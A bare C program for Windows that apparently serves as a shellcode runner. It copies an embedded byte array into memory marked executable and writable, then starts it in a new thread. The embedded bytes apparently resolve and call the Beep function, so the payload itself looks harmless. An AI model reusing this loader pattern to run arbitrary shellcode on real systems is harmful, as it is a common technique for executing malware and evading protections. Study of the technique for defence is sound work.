#include <windows.h>
#include <stdio.h>

char shellcode[] = "\x48\x83\xe4\xf0\x48\x89\xe5\x48\x81\xec\x00\x04\x00\x00\x48\xb8\x4b\x45\x52\x4e\x45\x4c\x33\x32\x41\x89\xc2\x48\x89\x44\x24\x32\x48\xb8\x33\x32\x2e\x64\x6c\x6c\x00\x00\x48\x89\x44\x24\x38\xc7\x44\x24\x2c\x42\x65\x65\x70\x66\xc7\x44\x24\x30\x00\x00\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x4c\x8b\x58\x18\x49\x83\xc3\x20\x4d\x89\xd9\xeb\x05\x4d\x39\xcb\x74\x35\x4d\x8b\x09\x45\x84\xd2\x74\x27\x49\x8b\x51\x50\x4c\x8d\x44\x24\x33\x44\x89\xd1\x0f\xb6\x02\x84\xc0\x74\x14\x38\xc8\x75\xdc\x41\x0f\xb6\x08\x48\x83\xc2\x01\x49\x83\xc0\x01\x84\xc9\x75\xe5\x4d\x8b\x51\x20\xeb\x06\x41\xba\x00\x00\x00\x00\x49\x63\x42\x3c\x41\x8b\xbc\x02\x88\x00\x00\x00\x4c\x01\xd7\x44\x8b\x5f\x18\x45\x85\xdb\x74\x69\x8b\x77\x20\x45\x89\xdb\x41\xb9\x00\x00\x00\x00\x4c\x01\xd6\x49\x8d\x6a\x01\xeb\x09\x49\x83\xc1\x01\x4d\x39\xd9\x74\x4b\x42\x8b\x04\x8e\x41\x0f\xb6\x14\x02\x84\xd2\x74\x23\x4c\x8d\x44\x24\x2c\x48\x01\xe8\x41\x0f\xb6\x08\x84\xc9\x74\x13\x38\xd1\x75\xd6\x0f\xb6\x10\x49\x83\xc0\x01\x48\x83\xc0\x01\x84\xd2\x75\xe5\x8b\x57\x24\x4d\x01\xc9\x4b\x8d\x04\x0a\x0f\xb7\x14\x10\x8b\x47\x1c\x49\x8d\x14\x92\x8b\x1c\x02\x4c\x01\xd3\xba\x26\x02\x00\x00\xb9\x26\x02\x00\x00\xff\xd3\x48\x81\xc4\x00\x04\x00\x00";

INT main()
{
	DWORD dwThreadId;
	HANDLE	thread_;
	void* image_base = VirtualAlloc(
		NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		0x40
	);
	RtlMoveMemory(image_base,shellcode,sizeof(shellcode));
	thread_ = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)image_base,
		NULL,
		0,
		0
	);
	WaitForSingleObject(thread_,INFINITE);
}